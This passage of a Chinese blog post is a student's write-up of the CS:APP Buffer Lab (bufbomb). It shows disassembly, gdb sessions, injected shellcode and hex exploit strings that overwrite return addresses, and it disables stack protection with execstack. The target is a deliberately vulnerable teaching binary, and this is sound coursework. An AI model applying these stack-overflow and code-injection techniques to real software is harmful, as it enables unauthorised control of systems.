<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fizz</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    entry_check(<span class="number">1</span>); <span class="comment">/* Make sure entered this function properly */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Fizz!: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called fizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>打印该函数地址：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/x fizz</span><br><span class="line"><span class="number">0</span>x8048dc0 &lt;fizz&gt;:       <span class="number">0</span>x53e58955</span><br></pre></td></tr></table></figure>
<p>生成cookie：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./makecookie SAXXXXXXXX</span><br><span class="line"><span class="number">0</span>x58932f5a</span><br></pre></td></tr></table></figure>
<p>部分反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">08048dc0 &lt;fizz&gt;:</span><br><span class="line">...</span><br><span class="line"> 8048dc4:	83 ec 14             	sub    $0x14,%esp</span><br><span class="line"> 8048dc7:	8b 5d 08             	mov    0x8(%ebp),%ebx	# 传入参数值</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>通过阅读汇编代码可以知道，0x8(%ebp)是传入的参数的存放地址，即$ebp+8,这里需要将其覆盖为生成的cookie值作为输入，而$ebp+4是原来正常的返回地址，需要覆盖为fizz的地址<code>0x8048dc0</code>。构造输入：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// exploit1.txt</span><br><span class="line">31 31 31 31 31 31 31 31 </span><br><span class="line">32 32 32 32 32 32 32 32 </span><br><span class="line">c0 8d 04 08 00 00 00 00 </span><br><span class="line">5a 2f 93 58 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>使用工具生成字符串并运行程序，结果如下：</p>
<p><img src="/post/ba783922/image-20221029190954349.png"></p>
<h3 id="level-2-firecracker">Level 2: Firecracker</h3>
<blockquote>
<p>目标：含有一个 bang 函数，和一个全局变量
global_value，需要注入机器代码，修改 global_value 为 cookies
的值，再调用 bang
函数。具体指令构造方法参加实验说明文档。可通过execstack工具解除栈执行限制。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> global_value = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bang</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    entry_check(<span class="number">2</span>); <span class="comment">/* Make sure entered this function properly */</span></span><br><span class="line">    <span class="keyword">if</span> (global_value == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Bang!: You set global_value to 0x%x\n&quot;</span>, global_value);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>bang 汇编语言的前几行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">08048d60 &lt;bang&gt;:</span><br><span class="line"> 8048d60:	55                   	push   %ebp</span><br><span class="line"> 8048d61:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d63:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048d66:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)</span><br><span class="line"> 8048d6d:	e8 2e fc ff ff       	call   80489a0 &lt;entry_check&gt;</span><br><span class="line"> 8048d72:	a1 dc a1 04 08       	mov    0x804a1dc,%eax	#get global_value</span><br><span class="line"> 8048d77:	3b 05 cc a1 04 08    	cmp    0x804a1cc,%eax	#cmp global_value:cookie</span><br><span class="line"> 8048d7d:	74 21                	je     8048da0 &lt;bang+0x40&gt;</span><br></pre></td></tr></table></figure>
<p>汇编语言的第7、8行对应源程序的if语句，所以猜测global_value被存储在<code>0x804a1dc</code>中，cookie被存储在<code>0x804a1cc</code>中。检查如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/x <span class="number">0</span>x804a1dc</span><br><span class="line"><span class="number">0</span>x804a1dc &lt;global_value&gt;: <span class="number">0</span>x00000000</span><br><span class="line">(gdb) x/x <span class="number">0</span>x804a1cc</span><br><span class="line"><span class="number">0</span>x804a1cc &lt;cookie&gt;:     <span class="number">0</span>x00000000</span><br></pre></td></tr></table></figure>
<p>思路是将汇编代码注入到char数组的首地址<code>0xffffb96c</code>，让char数组的首地址覆盖$eax+4y原来的返回地址，当发生ret时，就会跳转到char数组首地址执行注入的汇编代码。汇编代码中要先修改global_value的值，然后将
bang 函数的地址 push 进栈中，然后使用 ret
命令。当执行到注入的ret命令时，因为push了bang函数的地址，就会返回到bang函数执行。汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl  $0x58932f5a, 0x804a1dc		# global_value=cookie</span><br><span class="line">pushl $0x08048d60					# 将 bang 函数的首地址压入栈</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>将汇编语言转换成十六进制的机器代码：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc <span class="literal">-m32</span> <span class="literal">-c</span> example.s </span><br><span class="line">objdump <span class="literal">-d</span> example.o &gt; example.d</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	c7 05 dc a1 04 08 5a 	movl   $0x58932f5a,0x804a1dc</span><br><span class="line">   7:	2f 93 58 </span><br><span class="line">   a:	68 60 8d 04 08       	push   $0x8048d60</span><br><span class="line">   f:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>构造注入机器代码，转成字符串并运行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// exploit2.txt</span><br><span class="line">c7 05 dc a1 04 08 5a 2f </span><br><span class="line">93 58 68 60 8d 04 08 c3</span><br><span class="line">6c b9 ff ff 00 00 00 00</span><br></pre></td></tr></table></figure>
<p>结果出现段错误，是因为Linux系统默认开启了栈保护机制，用于阻止缓冲区溢出攻击。所以不可以在栈中直接执行指令，需要使用execstack工具解除栈执行限制。即使如此也只能在gdb调试下有效，实际运行仍然会出现段错误。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt<span class="literal">-get</span> install execstack 	<span class="comment">#安装execstack</span></span><br><span class="line">execstack <span class="literal">-s</span> bufbomb			<span class="comment">#修改程序堆栈的可执行属性</span></span><br></pre></td></tr></table></figure>
<p><img src="/post/ba783922/image-20221029201251844.png" style="zoom:80%;"></p>
<p><img src="/post/ba783922/image-20221029202121258.png"></p>
<h3 id="level-3-dynamite">Level 3: Dynamite</h3>
<blockquote>
<p>目标：这个 Level 要求我们注入一段能够修改 getbuf
返回值的代码，返回值从 1 改成 cookie
值，此外还需要还原所有破坏，继续运行 test 的剩下部分。函数正常返回时执行
第15行，我们要让函数执行第12行</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> local = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    entry_check(<span class="number">3</span>); <span class="comment">/* Make sure entered this function properly */</span></span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="comment">/* Check for corrupted stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != <span class="number">0xdeadbeef</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has been corrupted\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Boom!: getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数的返回值保存在%eax中，所以将cookie值放入这个寄存器中，并将原来正确的返回地址（即call
<getbuf>的下一条指令地址<code>0x804901e</code>）压入栈中，构造完成攻击的汇编代码如下:</getbuf></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x58932f5a, %eax		#move cookie to %eax, return %eax</span><br><span class="line">push $0x804901e				#push &lt;test&gt; return address</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>将汇编语言转换成十六进制的机器代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:	b8 5a 2f 93 58       	mov    $0x58932f5a,%eax</span><br><span class="line">   5:	68 1e 90 04 08       	push   $0x804901e</span><br><span class="line">   a:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>生成的机器代码一共是11个字节，再加上一个对齐字节凑足12字节，可以看到这时已经填满了char字符串的缓冲区。与上一个问题相同，还要用char字符串首地址<code>0xffffb96c</code>覆盖原来的返回地址，以便于执行注入的指令。但这里还要注意一点，为了保证栈不被破坏，除了必要的修改，我们必须保持其他的栈字保存不变，先打印出原来的数据：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/<span class="number">24</span>xb <span class="number">0</span>xffffb96c</span><br><span class="line"><span class="number">0</span>xffffb96c:     <span class="number">0</span>x31    <span class="number">0</span>x32    <span class="number">0</span>x33    <span class="number">0</span>x34    <span class="number">0</span>x00    <span class="number">0</span>x00    <span class="number">0</span>x00    <span class="number">0</span>x00</span><br><span class="line"><span class="number">0</span>xffffb974:     <span class="number">0</span>xc0    <span class="number">0</span>xb5    <span class="number">0</span>x04    <span class="number">0</span>x08    <span class="number">0</span>x98    <span class="number">0</span>xb9    <span class="number">0</span>xff    <span class="number">0</span>xff</span><br><span class="line"><span class="number">0</span>xffffb97c:     <span class="number">0</span>x1e    <span class="number">0</span>x90    <span class="number">0</span>x04    <span class="number">0</span>x08    <span class="number">0</span>x03    <span class="number">0</span>x00    <span class="number">0</span>x00    <span class="number">0</span>x00</span><br></pre></td></tr></table></figure>
<p>构造攻击代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// exploit3.txt</span><br><span class="line">b8 5a 2f 93 58 68 1e 90 </span><br><span class="line">04 08 c3 00 98 b9 ff ff</span><br><span class="line">6c b9 ff ff 03 00 00 00</span><br></pre></td></tr></table></figure>
<p>转成字符串并运行：</p>
<p><img src="/post/ba783922/image-20221029210254503.png"></p>

    </div>

    
    
    

    <div>
      
      <div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">
		-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------
		</div>
    
</div>
      
    </div>

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E5%AE%9E%E9%AA%8C/" rel="tag"><i class="fa fa-tag"></i> 实验</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/post/12d42946.html" rel="prev" title="中科大计算机系统作业2">
      <i class="fa fa-chevron-left"></i> 中科大计算机系统作业2
    </a></div>
      <div class="post-nav-item">
    <a href="/post/7ad1122c.html" rel="next" title="2022中科大CS考研面试记录">
      2022中科大CS考研面试记录 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C1%E4%BD%8D%E6%93%8D%E4%BD%9Cdata-lab"><span class="nav-number">1.</span> <span class="nav-text">实验1：位操作（Data Lab）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.1.</span> <span class="nav-text">实验介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="nav-number">1.2.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82"><span class="nav-number">1.3.</span> <span class="nav-text">实验要求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%80%9D%E8%B7%AF"><span class="nav-number">1.4.</span> <span class="nav-text">实验思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bitxor"><span class="nav-number">1.4.1.</span> <span class="nav-text">1. bitXor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tmin"><span class="nav-number">1.4.2.</span> <span class="nav-text">2. tmin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#istmax"><span class="nav-number">1.4.3.</span> <span class="nav-text">3. isTmax</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#alloddbits"><span class="nav-number">1.4.4.</span> <span class="nav-text">4. allOddBits</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#negate"><span class="nav-number">1.4.5.</span> <span class="nav-text">5. negate</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#isasciidigit"><span class="nav-number">1.4.6.</span> <span class="nav-text">6. isAsciiDigit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#conditional"><span class="nav-number">1.4.7.</span> <span class="nav-text">7. conditional</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#islessorequal"><span class="nav-number">1.4.8.</span> <span class="nav-text">8. isLessOrEqual</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#logicalneg"><span class="nav-number">1.4.9.</span> <span class="nav-text">9. logicalNeg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#howmanybits"><span class="nav-number">1.4.10.</span> <span class="nav-text">10. howManyBits</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#floatscale2"><span class="nav-number">1.4.11.</span> <span class="nav-text">11. floatScale2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#floatfloat2int"><span class="nav-number">1.4.12.</span> <span class="nav-text">12. floatFloat2Int</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#floatpower2"><span class="nav-number">1.4.13.</span> <span class="nav-text">13. floatPower2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C"><span class="nav-number">1.5.</span> <span class="nav-text">实验结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-number">1.6.</span> <span class="nav-text">补充</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C2%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9bomb-lab"><span class="nav-number">2.</span> <span class="nav-text">实验2：二进制炸弹（Bomb Lab）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%8B%E7%BB%8D-1"><span class="nav-number">2.1.</span> <span class="nav-text">实验介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-1"><span class="nav-number">2.2.</span> <span class="nav-text">实验要求</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E6%80%9D%E8%B7%AF-1"><span class="nav-number">2.3.</span> <span class="nav-text">实验思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-1"><span class="nav-number">2.3.1.</span> <span class="nav-text">Phase 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-2"><span class="nav-number">2.3.2.</span> <span class="nav-text">Phase 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-3"><span class="nav-number">2.3.3.</span> <span class="nav-text">Phase 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-4"><span class="nav-number">2.3.4.</span> <span class="nav-text">Phase 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-5"><span class="nav-number">2.3.5.</span> <span class="nav-text">Phase 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phase-6"><span class="nav-number">2.3.6.</span> <span class="nav-text">Phase 6</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%BB%93%E6%9E%9C-1"><span class="nav-number">2.4.</span> <span class="nav-text">实验结果</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C3%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BAbuffer-lab"><span class="nav-number">3.</span> <span class="nav-text">实验3：缓冲区溢出（Buffer Lab）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E6%A0%87"><span class="nav-number">3.1.</span> <span class="nav-text">实验目标</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%8B%E7%BB%8D-2"><span class="nav-number">3.2.</span> <span class="nav-text">实验介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="nav-number">3.3.</span> <span class="nav-text">实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#level-0-candle"><span class="nav-number">3.3.1.</span> <span class="nav-text">Level 0: Candle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-1-sparkler"><span class="nav-number">3.3.2.</span> <span class="nav-text">Level 1: Sparkler</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-2-firecracker"><span class="nav-number">3.3.3.</span> <span class="nav-text">Level 2: Firecracker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level-3-dynamite"><span class="nav-number">3.3.4.</span> <span class="nav-text">Level 3: Dynamite</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="YMZ"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">YMZ</p>
  <div class="site-description" itemprop="description">When is the best time to plant a tree? Ten years ago. And when is the next best time? Today.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">5</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/YMZLT" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;YMZLT" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:mzyang2000@163.com" title="E-Mail → mailto:mzyang2000@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">YMZ</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">55k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">1:08</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/pangu@4/dist/browser/pangu.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'N15JmLdA2cagBn85yKSsAbOI-gzGzoHsz',
      appKey     : '3vJcF2jNtl8bi0k492yvlyIh',
      placeholder: "在此处输入评论",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
